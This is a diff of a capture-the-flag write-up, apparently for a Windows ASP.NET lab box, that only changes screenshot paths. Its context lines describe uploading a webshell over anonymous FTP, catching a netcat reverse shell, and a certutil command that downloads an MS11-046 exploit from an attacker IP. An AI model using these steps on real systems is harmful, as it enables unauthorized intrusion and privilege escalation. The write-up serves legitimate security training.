@@ -43,7 +43,7 @@ What's particularly interesting is that anonymous login is allowed on port 21 so
 
 We'll make sure that anonymous login does work, which indeed it does.
 
-![](<../../../../.gitbook/assets/image (11).png>)
+![](<../../../../.gitbook/assets/image (11) (2).png>)
 
 However, there isn't anything useful for us here.
 
@@ -80,7 +80,7 @@ Seeing that the server is running ASP.NET and I have access to FTP, I can probab
 
 I decided to go with the webshell from SecLists
 
-![](<../../../../.gitbook/assets/image (7).png>)
+![](<../../../../.gitbook/assets/image (7) (2).png>)
 
 Now we'll upload it over ftp:
 
@@ -104,7 +104,7 @@ I use impacket-smbserver to host a windows netcat executable to then execute a c
 
 I also start a nc listener on my kali machine to catch a shell
 
-![](<../../../../.gitbook/assets/image (2) (1) (3).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (1).png>)
 
 Entering the following command into the webshell:
 
@@ -116,7 +116,7 @@ Entering the following command into the webshell:
 
 And I get a shell!
 
-![](<../../../../.gitbook/assets/image (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1).png>)
 
 ## Foothold w/ Metasploit
 
@@ -195,7 +195,7 @@ Since we don't have full access to any user, we'll create a temp directory insid
 certutil -urlcache -f http://10.10.14.13/MS11-046.exe MS11-046.exe
 ```
 
-![](<../../../../.gitbook/assets/image (8).png>)
+![](<../../../../.gitbook/assets/image (8) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (70).png>)
 
